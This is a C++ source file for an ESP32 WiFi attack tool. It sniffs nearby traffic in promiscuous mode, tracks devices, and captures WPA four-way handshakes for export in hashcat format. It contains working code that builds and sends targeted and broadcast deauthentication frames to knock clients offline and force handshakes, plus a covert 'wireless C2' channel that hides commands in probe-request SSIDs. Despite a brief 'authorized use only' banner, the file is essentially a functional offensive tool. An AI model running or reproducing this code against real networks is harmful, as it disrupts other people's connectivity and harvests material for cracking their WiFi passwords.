#include "PacketSniffer.h"
#include "CommandInterface.h"
#include <esp_wifi.h>

// Initialize static members
std::map<String, DeviceStats> PacketSniffer::devices;
std::vector<HandshakeInfo> PacketSniffer::handshakes;
uint32_t PacketSniffer::total_packets = 0;
uint32_t PacketSniffer::beacon_count = 0;
uint32_t PacketSniffer::probe_count = 0;
uint32_t PacketSniffer::data_count = 0;
uint32_t PacketSniffer::deauth_count = 0;
uint8_t PacketSniffer::current_channel = 1;
unsigned long PacketSniffer::last_channel_hop = 0;
unsigned long PacketSniffer::last_deauth_time = 0;
CommandInterface* PacketSniffer::command_interface = nullptr;

PacketSniffer::PacketSniffer() {
    // Constructor
}

void PacketSniffer::begin(uint8_t channel) {
    current_channel = channel;

    // Clear statistics
    devices.clear();
    handshakes.clear();
    total_packets = 0;
    beacon_count = 0;
    probe_count = 0;
    data_count = 0;
    deauth_count = 0;

    // Set WiFi to promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&PacketSniffer::packetHandler);
    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);

    Serial.println("[PacketSniffer] Started on channel " + String(current_channel));
    Serial.println("[PacketSniffer] Monitoring: Beacons, Probes, Data, Deauth, EAPOL");
}

void PacketSniffer::stop() {
    esp_wifi_set_promiscuous(false);
    Serial.println("[PacketSniffer] Stopped");
    Serial.printf("[PacketSniffer] Total packets: %u | Beacons: %u | Probes: %u | Data: %u | Deauth: %u\n",
                  total_packets, beacon_count, probe_count, data_count, deauth_count);
    Serial.printf("[PacketSniffer] Unique devices: %u | Handshakes: %u\n",
                  devices.size(), handshakes.size());
}

void PacketSniffer::setChannel(uint8_t channel) {
    current_channel = channel;
    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
}

void PacketSniffer::channelHop(bool enable) {
    if (enable) {
        current_channel++;
        if (current_channel > 13) current_channel = 1;
        setChannel(current_channel);
        last_channel_hop = millis();
    }
}

void PacketSniffer::setCommandInterface(CommandInterface* cmd_interface) {
    command_interface = cmd_interface;
    Serial.println("[PacketSniffer] Wireless C2 enabled - monitoring for magic packets");
}

uint32_t PacketSniffer::getTotalPackets() {
    return total_packets;
}

uint32_t PacketSniffer::getBeaconCount() {
    return beacon_count;
}

uint32_t PacketSniffer::getProbeCount() {
    return probe_count;
}

uint32_t PacketSniffer::getDataCount() {
    return data_count;
}

uint32_t PacketSniffer::getDeauthCount() {
    return deauth_count;
}

uint32_t PacketSniffer::getHandshakeCount() {
    return handshakes.size();
}

std::map<String, DeviceStats>& PacketSniffer::getDevices() {
    return devices;
}

const std::vector<HandshakeInfo>& PacketSniffer::getHandshakes() {
    return handshakes;
}

String PacketSniffer::macToString(const uint8_t* mac) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}

void IRAM_ATTR PacketSniffer::packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    // ISR context - keep minimal!
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) {
        return;
    }

    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const wifi_ieee80211_packet_t* ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
    const wifi_ieee80211_mac_hdr_t* hdr = &ipkt->hdr;

    total_packets++;

    // Can't safely process complex operations in ISR, so we defer to main loop
    // For now, increment counters based on frame type/subtype
    uint8_t frame_type = (hdr->frame_ctrl.type);
    uint8_t frame_subtype = (hdr->frame_ctrl.subtype);

    // Quick frame classification
    if (frame_type == FRAME_TYPE_MANAGEMENT) {
        if (frame_subtype == FRAME_SUBTYPE_BEACON) {
            beacon_count++;
        } else if (frame_subtype == FRAME_SUBTYPE_PROBE_REQ || frame_subtype == FRAME_SUBTYPE_PROBE_RESP) {
            probe_count++;
        } else if (frame_subtype == FRAME_SUBTYPE_DEAUTH || frame_subtype == FRAME_SUBTYPE_DISASSOC) {
            deauth_count++;
        }
    } else if (frame_type == FRAME_TYPE_DATA) {
        data_count++;
    }

    // Defer detailed processing to avoid ISR complexity
    processPacket(pkt);
}

void PacketSniffer::processPacket(const wifi_promiscuous_pkt_t* pkt) {
    const wifi_ieee80211_packet_t* ipkt = (wifi_ieee80211_packet_t*)pkt->payload;
    const wifi_ieee80211_mac_hdr_t* hdr = &ipkt->hdr;

    uint8_t frame_type = hdr->frame_ctrl.type;
    uint8_t frame_subtype = hdr->frame_ctrl.subtype;
    int8_t rssi = pkt->rx_ctrl.rssi;
    uint16_t len = pkt->rx_ctrl.sig_len;

    // Process based on frame type
    if (frame_type == FRAME_TYPE_MANAGEMENT) {
        switch (frame_subtype) {
            case FRAME_SUBTYPE_BEACON:
                processBeacon(ipkt, len, rssi);
                break;
            case FRAME_SUBTYPE_PROBE_REQ:
                processProbeRequest(ipkt, len, rssi);
                break;
            case FRAME_SUBTYPE_PROBE_RESP:
                processProbeResponse(ipkt, len, rssi);
                break;
            case FRAME_SUBTYPE_DEAUTH:
            case FRAME_SUBTYPE_DISASSOC:
                processDeauth(ipkt, len, rssi);
                break;
        }
    } else if (frame_type == FRAME_TYPE_DATA) {
        processDataFrame(ipkt, len, rssi);
    }
}

void PacketSniffer::processBeacon(const wifi_ieee80211_packet_t* pkt, uint16_t len, int8_t rssi) {
    const wifi_ieee80211_mac_hdr_t* hdr = &pkt->hdr;

    // Extract BSSID (addr3 for beacons)
    const uint8_t* bssid = hdr->addr3;

    // Beacon payload starts after MAC header (24 bytes) + beacon frame body (12 bytes)
    // Beacon frame body: timestamp(8) + interval(2) + capabilities(2)
    const uint8_t* payload = pkt->payload + 36;
    uint16_t payload_len = len - 36;

    // Extract SSID
    String ssid = extractSSID(payload, payload_len);

    // Get encryption type
    uint8_t enc_type = getEncryptionType(payload, payload_len);

    // Update device statistics
    updateDeviceStats(bssid, rssi, current_channel, true, ssid);

    // Update encryption info
    String mac_str = macToString(bssid);
    if (devices.find(mac_str) != devices.end()) {
        devices[mac_str].has_encryption = (enc_type > 0);
        devices[mac_str].encryption_type = enc_type;
        devices[mac_str].beacons_sent++;
    }
}

void PacketSniffer::processProbeRequest(const wifi_ieee80211_packet_t* pkt, uint16_t len, int8_t rssi) {
    const wifi_ieee80211_mac_hdr_t* hdr = &pkt->hdr;

    // Source MAC (addr2 for probe requests)
    const uint8_t* src_mac = hdr->addr2;

    // Probe request payload
    const uint8_t* payload = pkt->payload + 24;
    uint16_t payload_len = len - 24;

    // Extract SSID (if not broadcast)
    String ssid = extractSSID(payload, payload_len);

    // Check for wireless C2 magic packet
    if (command_interface != nullptr && CommandInterface::isMagicPacket(ssid)) {
        command_interface->processWirelessCommand(ssid, src_mac);
        // Don't process further - this is a command, not a real probe
        return;
    }

    // Update device statistics (client device)
    updateDeviceStats(src_mac, rssi, current_channel, false, ssid);

    // Update probe count
    String mac_str = macToString(src_mac);
    if (devices.find(mac_str) != devices.end()) {
        devices[mac_str].probes_sent++;
    }
}

void PacketSniffer::processProbeResponse(const wifi_ieee80211_packet_t* pkt, uint16_t len, int8_t rssi) {
    const wifi_ieee80211_mac_hdr_t* hdr = &pkt->hdr;

    // BSSID (addr3)
    const uint8_t* bssid = hdr->addr3;

    // Similar to beacon processing
    const uint8_t* payload = pkt->payload + 36;
    uint16_t payload_len = len - 36;

    String ssid = extractSSID(payload, payload_len);
    uint8_t enc_type = getEncryptionType(payload, payload_len);

    updateDeviceStats(bssid, rssi, current_channel, true, ssid);

    String mac_str = macToString(bssid);
    if (devices.find(mac_str) != devices.end()) {
        devices[mac_str].has_encryption = (enc_type > 0);
        devices[mac_str].encryption_type = enc_type;
    }
}

void PacketSniffer::processDeauth(const wifi_ieee80211_packet_t* pkt, uint16_t len, int8_t rssi) {
    const wifi_ieee80211_mac_hdr_t* hdr = &pkt->hdr;

    // Deauth source (addr2)
    const uint8_t* src_mac = hdr->addr2;
    // Deauth destination (addr1)
    const uint8_t* dst_mac = hdr->addr1;

    // Log deauth activity (could indicate attack or legitimate disconnect)
    Serial.printf("[DEAUTH] %s -> %s (RSSI: %d)\n",
                  macToString(src_mac).c_str(),
                  macToString(dst_mac).c_str(),
                  rssi);
}

void PacketSniffer::processDataFrame(const wifi_ieee80211_packet_t* pkt, uint16_t len, int8_t rssi) {
    const wifi_ieee80211_mac_hdr_t* hdr = &pkt->hdr;

    // Extract addresses based on toDS/fromDS flags
    const uint8_t* src_mac = hdr->addr2;
    const uint8_t* dst_mac = hdr->addr1;
    const uint8_t* bssid = hdr->addr3;

    // Check for EAPOL frames (EtherType 0x888E)
    // Data frame payload starts after MAC header
    const uint8_t* payload = pkt->payload + sizeof(wifi_ieee80211_mac_hdr_t);
    uint16_t payload_len = len - sizeof(wifi_ieee80211_mac_hdr_t);

    // Check for LLC/SNAP header + EAPOL
    if (payload_len > 8) {
        // LLC header: DSAP(1) SSAP(1) Control(1) = 0xAA 0xAA 0x03
        // SNAP: OUI(3) = 0x00 0x00 0x00, Type(2)
        if (payload[0] == 0xAA && payload[1] == 0xAA && payload[2] == 0x03) {
            // Check EtherType at offset 6-7
            uint16_t ethertype = (payload[6] << 8) | payload[7];
            if (ethertype == 0x888E) {
                // EAPOL frame detected!
                processEAPOL(payload + 8, payload_len - 8, src_mac, dst_mac, bssid);
            }
        }
    }

    // Update device statistics
    updateDeviceStats(src_mac, rssi, current_channel, false);
    String mac_str = macToString(src_mac);
    if (devices.find(mac_str) != devices.end()) {
        devices[mac_str].data_frames++;
    }
}

void PacketSniffer::processEAPOL(const uint8_t* payload, uint16_t len, const uint8_t* src, const uint8_t* dst, const uint8_t* bssid) {
    if (len < sizeof(eapol_key_frame_t)) return;

    // Parse EAPOL key frame
    const eapol_key_frame_t* eapol = (const eapol_key_frame_t*)payload;

    // EAPOL-Key packet (type 3)
    if (eapol->type != 3) return;

    // WPA Key (descriptor type 254 or 2)
    if (eapol->descriptor_type != 254 && eapol->descriptor_type != 2) return;

    // Convert key_info from big-endian
    uint16_t key_info = (eapol->key_info >> 8) | (eapol->key_info << 8);

    // Determine which message this is
    bool is_pairwise = (key_info & 0x0008) != 0;
    bool has_mic = (key_info & 0x0100) != 0;
    bool is_ack = (key_info & 0x0080) != 0;
    bool install = (key_info & 0x0040) != 0;

    // Extract key version (bits 0-2)
    uint8_t key_ver = key_info & 0x0007;

    // Determine message number
    uint8_t message_num = 0;
    if (is_pairwise) {
        if (is_ack && !has_mic && !install) {
            message_num = 1; // M1
        } else if (!is_ack && has_mic && !install) {
            message_num = 2; // M2
        } else if (is_ack && has_mic && install) {
            message_num = 3; // M3
        } else if (!is_ack && has_mic && !install) {
            message_num = 4; // M4 (or could be M2, disambiguate by checking if we've seen M1)
        }
    }

    if (message_num == 0) return; // Not a pairwise handshake message

    Serial.printf("[EAPOL] %s <-> %s [M%d]",
                  macToString(src).c_str(),
                  macToString(dst).c_str(),
                  message_num);

    // Determine AP and Client MACs
    // M1: AP->Client (src=AP, dst=Client)
    // M2: Client->AP (src=Client, dst=AP)
    // M3: AP->Client (src=AP, dst=Client)
    // M4: Client->AP (src=Client, dst=AP)
    const uint8_t* ap_mac = (message_num == 1 || message_num == 3) ? src : dst;
    const uint8_t* client_mac = (message_num == 1 || message_num == 3) ? dst : src;

    // Find or create handshake tracking entry
    HandshakeInfo* hs = findHandshake(client_mac, ap_mac);
    if (hs == nullptr) {
        // Create new handshake entry
        HandshakeInfo new_hs;
        memcpy(new_hs.client_mac, client_mac, 6);
        memcpy(new_hs.ap_mac, ap_mac, 6);
        new_hs.ssid = getSSIDForBSSID(ap_mac);
        new_hs.has_m1 = false;
        new_hs.has_m2 = false;
        new_hs.has_m3 = false;
        new_hs.has_m4 = false;
        new_hs.timestamp = millis();
        new_hs.last_update = millis();
        new_hs.is_complete = false;
        new_hs.is_full_handshake = false;
        new_hs.keyver = key_ver;
        new_hs.eapol_m1_len = 0;
        new_hs.eapol_m2_len = 0;
        memset(new_hs.anonce, 0, 32);
        memset(new_hs.snonce, 0, 32);
        memset(new_hs.mic, 0, 16);

        handshakes.push_back(new_hs);
        hs = &handshakes.back();

        Serial.printf(" [NEW HANDSHAKE: %s]", hs->ssid.c_str());
    }

    // Update handshake with message data
    hs->last_update = millis();

    switch (message_num) {
        case 1:
            if (!hs->has_m1) {
                hs->has_m1 = true;
                memcpy(hs->anonce, eapol->key_nonce, 32);

                // Store M1 frame for hashcat export
                uint16_t m1_len = len < 256 ? len : 255;
                memcpy(hs->eapol_m1, payload, m1_len);
                hs->eapol_m1_len = m1_len;

                Serial.printf(" [ANonce extracted]");
            }
            break;

        case 2:
            if (!hs->has_m2) {
                hs->has_m2 = true;
                memcpy(hs->snonce, eapol->key_nonce, 32);
                memcpy(hs->mic, eapol->key_mic, 16);

                // Store M2 frame for hashcat export
                uint16_t m2_len = len < 256 ? len : 255;
                memcpy(hs->eapol_m2, payload, m2_len);
                hs->eapol_m2_len = m2_len;

                Serial.printf(" [SNonce + MIC extracted]");
            }
            break;

        case 3:
            if (!hs->has_m3) {
                hs->has_m3 = true;
                // M3 also contains ANonce (should match M1)
                Serial.printf(" [M3 confirmed]");
            }
            break;

        case 4:
            if (!hs->has_m4) {
                hs->has_m4 = true;
                Serial.printf(" [M4 confirmed]");
            }
            break;
    }

    // Update handshake state
    updateHandshakeState(hs);

    Serial.println();
}

String PacketSniffer::extractSSID(const uint8_t* payload, uint16_t len) {
    // SSID is in Information Elements (IE)
    // IE format: Type(1) Length(1) Data(variable)
    // SSID IE type = 0

    uint16_t offset = 0;
    while (offset + 2 < len) {
        uint8_t ie_type = payload[offset];
        uint8_t ie_len = payload[offset + 1];

        if (ie_type == 0 && ie_len > 0 && ie_len <= 32) {
            // Found SSID
            char ssid[33];
            memcpy(ssid, payload + offset + 2, ie_len);
            ssid[ie_len] = '\0';
            return String(ssid);
        }

        offset += 2 + ie_len;
    }

    return "";
}

uint8_t PacketSniffer::getEncryptionType(const uint8_t* payload, uint16_t len) {
    // Check capabilities field (first 2 bytes of beacon/probe payload before IEs)
    // Actually, capabilities are in the fixed params before payload
    // For simplicity, scan RSN/WPA IEs

    bool has_rsn = false;
    bool has_wpa = false;
    bool has_wep = false;

    uint16_t offset = 0;
    while (offset + 2 < len) {
        uint8_t ie_type = payload[offset];
        uint8_t ie_len = payload[offset + 1];

        if (ie_type == 48) {
            // RSN IE (WPA2)
            has_rsn = true;
        } else if (ie_type == 221 && ie_len >= 4) {
            // Vendor specific - check for WPA
            if (payload[offset + 2] == 0x00 && payload[offset + 3] == 0x50 &&
                payload[offset + 4] == 0xF2 && payload[offset + 5] == 0x01) {
                has_wpa = true;
            }
        }

        offset += 2 + ie_len;
    }

    if (has_rsn) return 3; // WPA2
    if (has_wpa) return 2; // WPA
    // TODO: Detect WEP from capability bits
    return 0; // Open
}

void PacketSniffer::updateDeviceStats(const uint8_t* mac, int8_t rssi, uint8_t channel, bool is_ap, const String& ssid) {
    String mac_str = macToString(mac);

    uint32_t now = millis();

    if (devices.find(mac_str) == devices.end()) {
        // New device
        DeviceStats stats;
        memcpy(stats.mac, mac, 6);
        stats.mac_str = mac_str;
        stats.first_seen = now;
        stats.last_seen = now;
        stats.packet_count = 1;
        stats.avg_rssi = rssi;
        stats.max_rssi = rssi;
        stats.is_ap = is_ap;
        stats.ssid = ssid;
        stats.beacons_sent = 0;
        stats.probes_sent = 0;
        stats.data_frames = 0;
        stats.has_encryption = false;
        stats.encryption_type = 0;
        stats.channels.push_back(channel);

        devices[mac_str] = stats;

        Serial.printf("[NEW DEVICE] %s | RSSI: %d | Ch: %u | %s%s\n",
                      mac_str.c_str(), rssi, channel,
                      is_ap ? "AP" : "Client",
                      ssid.length() > 0 ? (" | " + ssid).c_str() : "");
    } else {
        // Update existing device
        DeviceStats& stats = devices[mac_str];
        stats.last_seen = now;
        stats.packet_count++;

        // Update RSSI (rolling average)
        stats.avg_rssi = (stats.avg_rssi * 9 + rssi) / 10;
        if (rssi > stats.max_rssi) stats.max_rssi = rssi;

        // Update channel if new
        bool has_channel = false;
        for (uint8_t ch : stats.channels) {
            if (ch == channel) {
                has_channel = true;
                break;
            }
        }
        if (!has_channel) {
            stats.channels.push_back(channel);
        }

        // Update SSID if it was empty
        if (stats.ssid.length() == 0 && ssid.length() > 0) {
            stats.ssid = ssid;
            Serial.printf("[SSID UPDATE] %s -> %s\n", mac_str.c_str(), ssid.c_str());
        }
    }
}

HandshakeInfo* PacketSniffer::findHandshake(const uint8_t* client_mac, const uint8_t* ap_mac) {
    for (auto& hs : handshakes) {
        if (memcmp(hs.client_mac, client_mac, 6) == 0 &&
            memcmp(hs.ap_mac, ap_mac, 6) == 0) {
            return &hs;
        }
    }
    return nullptr;
}

void PacketSniffer::updateHandshakeState(HandshakeInfo* hs) {
    if (hs == nullptr) return;

    // Minimum for cracking: M1 + M2 (or M2 + M3)
    bool was_complete = hs->is_complete;

    if (hs->has_m1 && hs->has_m2) {
        hs->is_complete = true;
    } else if (hs->has_m2 && hs->has_m3) {
        hs->is_complete = true;
    }

    // Full handshake: M1 + M2 + M3 + M4
    if (hs->has_m1 && hs->has_m2 && hs->has_m3 && hs->has_m4) {
        hs->is_full_handshake = true;
    }

    // Announce completion
    if (hs->is_complete && !was_complete) {
        Serial.println();
        Serial.println("╔════════════════════════════════════════════════════════════╗");
        Serial.println("║          ★★★ COMPLETE HANDSHAKE CAPTURED! ★★★            ║");
        Serial.println("╚════════════════════════════════════════════════════════════╝");
        Serial.printf("  SSID: %s\n", hs->ssid.c_str());
        Serial.printf("  AP:   %s\n", macToString(hs->ap_mac).c_str());
        Serial.printf("  Client: %s\n", macToString(hs->client_mac).c_str());
        Serial.printf("  Messages: M1=%c M2=%c M3=%c M4=%c\n",
                      hs->has_m1 ? 'Y' : 'N',
                      hs->has_m2 ? 'Y' : 'N',
                      hs->has_m3 ? 'Y' : 'N',
                      hs->has_m4 ? 'Y' : 'N');
        Serial.printf("  Key Version: %u ", hs->keyver);
        if (hs->keyver == 1) Serial.println("(TKIP)");
        else if (hs->keyver == 2) Serial.println("(AES-CCMP)");
        else if (hs->keyver == 3) Serial.println("(AES-128-CMAC)");
        else Serial.println("(Unknown)");
        Serial.println("════════════════════════════════════════════════════════════");
        Serial.println();
    }
}

String PacketSniffer::getSSIDForBSSID(const uint8_t* bssid) {
    String mac_str = macToString(bssid);
    if (devices.find(mac_str) != devices.end()) {
        return devices[mac_str].ssid;
    }
    return "";
}

String PacketSniffer::exportHandshakeHashcat(const HandshakeInfo& hs) {
    // Export in hashcat 22000 format (EAPOL)
    // Format: WPA*TYPE*ESSID_HEX*AP_MAC*CLIENT_MAC*NONCE_AP*EAPOL_CLIENT*NONCE_CLIENT*...

    if (!hs.is_complete) {
        return "Handshake not complete";
    }

    String output = "WPA*";

    // Type (01 = WPA, 02 = WPA2)
    output += (hs.keyver == 1) ? "01" : "02";
    output += "*";

    // ESSID in hex
    for (size_t i = 0; i < hs.ssid.length(); i++) {
        char hex[3];
        sprintf(hex, "%02X", (unsigned char)hs.ssid[i]);
        output += String(hex);
    }
    output += "*";

    // AP MAC
    for (int i = 0; i < 6; i++) {
        char hex[3];
        sprintf(hex, "%02X", hs.ap_mac[i]);
        output += String(hex);
    }
    output += "*";

    // Client MAC
    for (int i = 0; i < 6; i++) {
        char hex[3];
        sprintf(hex, "%02X", hs.client_mac[i]);
        output += String(hex);
    }
    output += "*";

    // ANonce
    for (int i = 0; i < 32; i++) {
        char hex[3];
        sprintf(hex, "%02X", hs.anonce[i]);
        output += String(hex);
    }
    output += "*";

    // EAPOL from M2 (in hex)
    for (int i = 0; i < hs.eapol_m2_len; i++) {
        char hex[3];
        sprintf(hex, "%02X", hs.eapol_m2[i]);
        output += String(hex);
    }
    output += "*";

    // SNonce
    for (int i = 0; i < 32; i++) {
        char hex[3];
        sprintf(hex, "%02X", hs.snonce[i]);
        output += String(hex);
    }

    return output;
}

void PacketSniffer::printHandshakeSummary() {
    Serial.println("\n╔═══════════════════════════════════════════════════════════════╗");
    Serial.printf("║  CAPTURED HANDSHAKES: %u                                      \n", handshakes.size());
    Serial.println("╚═══════════════════════════════════════════════════════════════╝");

    if (handshakes.empty()) {
        Serial.println("  No handshakes captured yet.");
        return;
    }

    for (size_t i = 0; i < handshakes.size(); i++) {
        const HandshakeInfo& hs = handshakes[i];

        Serial.printf("\n[%u] %s\n", i + 1, hs.is_complete ? "✓ COMPLETE" : "✗ INCOMPLETE");
        Serial.printf("    SSID:   %s\n", hs.ssid.c_str());
        Serial.printf("    AP:     %s\n", macToString(hs.ap_mac).c_str());
        Serial.printf("    Client: %s\n", macToString(hs.client_mac).c_str());
        Serial.printf("    M1:%c M2:%c M3:%c M4:%c | KeyVer:%u | Age:%lus\n",
                      hs.has_m1 ? '✓' : '✗',
                      hs.has_m2 ? '✓' : '✗',
                      hs.has_m3 ? '✓' : '✗',
                      hs.has_m4 ? '✓' : '✗',
                      hs.keyver,
                      (millis() - hs.timestamp) / 1000);

        if (hs.is_complete) {
            Serial.println("    [Ready for hashcat export]");
        }
    }
    Serial.println();
}

// ==================== DEAUTH ATTACK FUNCTIONS ====================

void PacketSniffer::buildDeauthFrame(uint8_t* frame, const uint8_t* dest, const uint8_t* src, const uint8_t* bssid, uint8_t reason) {
    // 802.11 Deauth frame structure:
    // Frame Control (2) + Duration (2) + Dest (6) + Src (6) + BSSID (6) + Seq (2) + Reason (2) = 26 bytes

    uint16_t seq_num = 0;  // Can be randomized

    // Frame Control: Type=Management, Subtype=Deauth
    frame[0] = 0xC0;  // 11000000 = version 0, type 00 (management), subtype 1100 (deauth)
    frame[1] = 0x00;  // Flags

    // Duration
    frame[2] = 0x00;
    frame[3] = 0x00;

    // Destination MAC (receiver)
    memcpy(&frame[4], dest, 6);

    // Source MAC (sender)
    memcpy(&frame[10], src, 6);

    // BSSID
    memcpy(&frame[16], bssid, 6);

    // Sequence Control
    frame[22] = seq_num & 0xFF;
    frame[23] = (seq_num >> 8) & 0xFF;

    // Reason Code (little-endian)
    frame[24] = reason;
    frame[25] = 0x00;
}

void PacketSniffer::sendDeauthAttack(const uint8_t* target_mac, const uint8_t* ap_mac, uint8_t reason) {
    // Rate limiting to prevent abuse
    unsigned long now = millis();
    if (now - last_deauth_time < DEAUTH_RATE_LIMIT_MS) {
        Serial.println("[DEAUTH] Rate limited - wait 100ms between attacks");
        return;
    }
    last_deauth_time = now;

    uint8_t deauth_frame[26];

    // Build deauth from AP to client
    buildDeauthFrame(deauth_frame, target_mac, ap_mac, ap_mac, reason);

    // Send deauth packet
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

    if (result == ESP_OK) {
        Serial.printf("[DEAUTH] Sent to %s from AP %s (reason=%u)\n",
                      macToString(target_mac).c_str(),
                      macToString(ap_mac).c_str(),
                      reason);
        deauth_count++;
    } else {
        Serial.printf("[DEAUTH] FAILED to send (error %d)\n", result);
    }

    // Also send deauth from client to AP (bidirectional for effectiveness)
    buildDeauthFrame(deauth_frame, ap_mac, target_mac, ap_mac, reason);
    result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

    if (result == ESP_OK) {
        Serial.printf("[DEAUTH] Sent from %s to AP (bidirectional)\n",
                      macToString(target_mac).c_str());
    }
}

void PacketSniffer::sendDeauthBroadcast(const uint8_t* ap_mac, uint8_t reason) {
    // Broadcast deauth to all clients on this AP
    // WARNING: This disconnects ALL clients - use with caution!

    Serial.println();
    Serial.println("╔════════════════════════════════════════════════════════════╗");
    Serial.println("║  ⚠️  WARNING: BROADCAST DEAUTH ATTACK                   ║");
    Serial.println("║  This will disconnect ALL clients from the AP             ║");
    Serial.println("║  AUTHORIZED USE ONLY - Ensure you have permission!        ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.println();

    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t deauth_frame[26];

    // Build deauth to broadcast address
    buildDeauthFrame(deauth_frame, broadcast_mac, ap_mac, ap_mac, reason);

    // Send multiple frames for reliability
    for (int i = 0; i < 5; i++) {
        esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

        if (result == ESP_OK) {
            Serial.printf("[DEAUTH] Broadcast packet %d/5 sent from AP %s\n",
                          i + 1, macToString(ap_mac).c_str());
            deauth_count++;
        }

        delay(10);  // Small delay between bursts
    }
}

void PacketSniffer::triggerHandshake(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t burst_count) {
    Serial.println();
    Serial.println("╔════════════════════════════════════════════════════════════╗");
    Serial.println("║          TRIGGERING HANDSHAKE CAPTURE                      ║");
    Serial.println("╚════════════════════════════════════════════════════════════╝");
    Serial.printf("  AP:     %s\n", macToString(ap_mac).c_str());
    Serial.printf("  Client: %s\n", macToString(client_mac).c_str());
    Serial.printf("  Burst:  %u deauth packets\n", burst_count);
    Serial.println("════════════════════════════════════════════════════════════");

    // Check if we already have this handshake
    HandshakeInfo* existing = findHandshake(client_mac, ap_mac);
    if (existing && existing->is_complete) {
        Serial.println("\n⚠️  Warning: Handshake already captured for this pair!");
        Serial.println("Proceeding anyway (may capture additional handshake)...\n");
    }

    // Send deauth burst to force reconnection
    for (uint8_t i = 0; i < burst_count; i++) {
        sendDeauthAttack(client_mac, ap_mac, DEAUTH_REASON_UNSPECIFIED);
        delay(100);  // 100ms between deauths
    }

    Serial.println();
    Serial.println("✓ Deauth burst complete!");
    Serial.println("→ Monitoring for handshake (reconnection should happen within 5-10s)");
    Serial.println("→ Watch for [EAPOL] messages...");
    Serial.println();
}
